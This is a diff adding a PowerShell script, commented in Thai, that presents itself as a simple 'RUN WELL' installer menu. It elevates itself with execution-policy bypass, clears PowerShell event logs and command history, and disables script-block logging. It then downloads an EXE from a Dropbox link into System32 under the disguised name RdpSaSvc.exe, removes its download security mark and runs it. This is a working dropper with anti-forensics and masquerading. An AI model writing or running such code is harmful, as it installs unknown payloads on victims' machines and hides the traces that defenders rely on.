@@ -1,0 +1,137 @@
+try {
+    Add-Type -AssemblyName System.Windows.Forms
+    [Windows.Forms.Clipboard]::Clear()
+} catch {}
+
+# --- FORCE RUN AS ADMINISTRATOR ---
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# เคลียร์ Log หลักสองตัว (ถ้าไม่ใช่ Admin อย่าลืม Run as Administrator ก่อนนะ)
+Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
+Wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+
+# ส่วนอันนี้ถ้าไม่มีเครื่องก็จะไม่ฟ้อง Error แล้วครับ
+Wevtutil cl "PowerShellCore/Operational" 2>$null
+
+Clear-History
+try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
+
+$sbPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+if (-not (Test-Path $sbPath)) { New-Item -Path $sbPath -Force | Out-Null }
+Set-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
+
+foreach ($log in @("Microsoft-Windows-PowerShell/Operational", "Windows PowerShell")) {
+    try {
+        [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($log)
+        continue
+    } catch {}
+    try {
+        wevtutil sl "$log" /e:false 2>$null
+        wevtutil cl "$log"          2>$null
+        wevtutil sl "$log" /e:true  2>$null
+    } catch {}
+}
+
+$histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $histPath) { Clear-Content $histPath -Force -ErrorAction SilentlyContinue }
+
+
+# ==========================================
+# ส่วนตั้งค่า (แก้ไขข้อมูลของคุณที่นี่)
+# ==========================================
+$DirectLink   = "https://www.dropbox.com/scl/fi/o18kdmr5ch3ooa4kqiitk/TEST.exe?rlkey=6zro7ghhtsk51fowtyn4r3t7r&st=fqqaxjm7&dl=1"       # ลิงก์ตรงสำหรับดาวน์โหลดไฟล์ EXE
+$TargetFolder = "C:\Windows\System32"          #โฟลเดอร์ปลายทางที่ต้องการเก็บไฟล์
+$NewFileName  = "RdpSaSvc.exe"                       # ชื่อไฟล์ใหม่ที่ต้องการเปลี่ยน
+# ==========================================
+
+$FullPath = Join-Path $TargetFolder $NewFileName
+
+function Show-Menu {
+    Clear-Host
+    Write-Host "=========================================" -ForegroundColor Cyan
+    Write-Host "               RUN WELL                  " -ForegroundColor Cyan
+    Write-Host "=========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    # ตรวจสอบไฟล์ใน Path: ถ้ามีไฟล์จะเปลี่ยนข้อความปุ่มกดเป็น RUN ทันที
+    if (Test-Path $FullPath) {
+        Write-Host "[1] RUN" -ForegroundColor Green
+    } else {
+        Write-Host "[1] INSTALL" -ForegroundColor Yellow
+    }
+
+    Write-Host "[2] UNINSTALL)" -ForegroundColor Red
+    Write-Host "[3] EXIT"
+    Write-Host ""
+    Write-Host "=========================================" -ForegroundColor Cyan
+}
+
+while ($true) {
+    Show-Menu
+    $choice = Read-Host "Press Number 1-3"
+
+    switch ($choice) {
+        "1" {
+            if (Test-Path $FullPath) {
+                # --- โหมด RUN (รันแบบเสมือนแอปที่ติดตั้งอย่างถูกต้อง/น่าเชื่อถือ) ---
+                Write-Host "`nStarting..." -ForegroundColor Green
+
+                # ทำการเคลียร์บล็อกความปลอดภัยซ้ำอีกครั้งเพื่อความชัวร์ก่อนรัน
+                Unblock-File -Path $FullPath -ErrorAction SilentlyContinue
+
+                # สั่งรันแอปพลิเคชัน
+                Start-Process -FilePath $FullPath
+                Start-Sleep -Seconds 2
+            } else {
+                # --- โหมด INSTALL ---
+                Write-Host "`nLinking" -ForegroundColor Gray
+                if (!(Test-Path $TargetFolder)) {
+                    New-Item -ItemType Directory -Path $TargetFolder -Force | Out-Null
+                }
+
+                Write-Host "Downloading" -ForegroundColor Yellow
+                try {
+                    Invoke-WebRequest -Uri $DirectLink -OutFile $FullPath -ErrorAction Stop
+
+                    # [จุดสำคัญ] ปลดล็อกความปลอดภัยทันทีหลังโหลดเสร็จ เพื่อให้ Windows เชื่อถือไฟล์นี้ (Trusted)
+                    Unblock-File -Path $FullPath
+
+                    Write-Host "Sucess" -ForegroundColor Green
+                } catch {
+                    Write-Host "Error: $_" -ForegroundColor Red
+                }
+                Read-Host "`nPress Enter To back"
+            }
+        }
+
+        "2" {
+            # --- โหมด UNINSTALL ---
+            if (Test-Path $FullPath) {
+                Write-Host "`nDeleting..." -ForegroundColor Yellow
+                Remove-Item -Path $FullPath -Force
+
+                # ลบโฟลเดอร์ด้วยถ้าหากไม่มีไฟล์อื่นเหลืออยู่
+                if ((Get-ChildItem -Path $TargetFolder).Count -eq 0) {
+                    Remove-Item -Path $TargetFolder -Force
+                }
+                Write-Host "Deleted" -ForegroundColor Green
+            } else {
+                Write-Host "`nNo Found EXE" -ForegroundColor Red
+            }
+            Read-Host "`nEnter To Back"
+        }
+
+        "3" {
+            Write-Host "`nExited" -ForegroundColor Cyan
+            exit
+        }
+
+        default {
+            Write-Host "`nNo Correct" -ForegroundColor Red
+            Start-Sleep -Seconds 1.5
+        }
+    }
+}
